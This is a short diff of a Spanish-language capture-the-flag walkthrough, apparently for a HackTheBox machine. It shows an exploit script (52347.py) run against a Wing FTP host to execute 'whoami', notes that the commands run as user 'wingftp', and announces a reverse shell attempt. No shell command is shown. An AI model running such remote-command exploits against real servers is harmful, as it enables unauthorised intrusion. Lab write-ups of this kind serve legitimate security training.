@@ -28,4 +28,6 @@ Lo ejecutamos buscando saber que usuario somos
 python3 52347.py -u http://ftp.wingdata.htb -c whoami
 ```
 
-Nos devuelbe 
+Nos devuelve que somos el usuario `wingftp`
+
+Vamos a intentar mandarnos una reverse shell
